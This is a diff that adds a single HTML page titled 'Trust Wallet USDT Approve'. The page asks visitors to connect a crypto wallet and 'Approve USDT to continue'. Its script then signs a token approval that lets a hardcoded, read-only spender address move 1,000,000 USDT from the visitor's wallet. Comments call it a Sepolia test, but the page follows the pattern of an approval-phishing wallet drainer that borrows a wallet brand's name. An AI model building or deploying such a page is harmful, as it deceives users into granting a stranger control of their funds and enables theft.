@@ -1,0 +1,87 @@
+<!DOCTYPE html><html>
+<head>
+  <title>Trust Wallet USDT Approve</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+  <style>
+    body {
+      background-color: #0e0e0e;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 2rem;
+    }
+    .container {
+      background: #1a1a1a;
+      padding: 2rem;
+      border-radius: 12px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+    }
+    button {
+      background-color: #01c38d;
+      border: none;
+      padding: 1rem 2rem;
+      font-size: 1rem;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 1.5rem;
+    }
+    button:hover {
+      background-color: #00a87c;
+    }
+    input {
+      padding: 0.6rem;
+      margin-top: 1rem;
+      width: 100%;
+      border-radius: 6px;
+      border: 1px solid #444;
+      background: #111;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Connect Your Wallet</h2>
+    <p>Approve USDT to continue</p>
+    <button onclick="connectWallet()">Connect Wallet</button>
+    <input type="text" id="spender" value="0x2ccd366b2e7f877357ce77612b54a28922b92e42" readonly />
+    <button onclick="approveUSDT()">Approve</button>
+  </div>  <script>
+    let signer;
+    let provider;
+
+    const usdtAddress = "0x148f2aC944c6AA1Eb51Ff5d246d0a6A6e65c6780"; // Sepolia USDT (6 decimals)
+    const spenderAddress = document.getElementById("spender").value;
+    const usdtAbi = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    async function connectWallet() {
+      if (typeof window.ethereum !== 'undefined') {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        alert("Wallet connected");
+      } else {
+        alert("Please install a Web3 wallet like MetaMask or Trust Wallet.");
+      }
+    }
+
+    async function approveUSDT() {
+      try {
+        const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+        const amount = ethers.utils.parseUnits("1000000", 6); // 1,000,000 USDT (for test)
+        const tx = await contract.approve(spenderAddress, amount);
+        await tx.wait();
+        alert("Approved Successfully!");
+      } catch (err) {
+        alert("Approval Failed: " + err.message);
+      }
+    }
+  </script></body>
+</html>
